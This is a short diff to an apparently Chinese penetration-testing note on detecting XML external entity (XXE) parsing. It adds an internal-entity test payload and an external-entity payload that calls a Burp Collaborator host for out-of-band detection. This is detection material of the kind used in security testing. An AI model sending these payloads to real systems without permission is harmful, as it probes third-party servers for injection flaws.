@@ -1,6 +1,13 @@
 #检测是否解析实体
+（1）
 <!DOCTYPE note [
 <!ENTITY test  "ivan_test">
+]>
+&test;
+
+（2）burp下使用collaborator检测
+<!DOCTYPE note [
+<!ENTITY test SYSTEM "http://0mn5ma5xdjr8h6wiauyk1x4k0b63us.burpcollaborator.net">
 ]>
 &test;
 
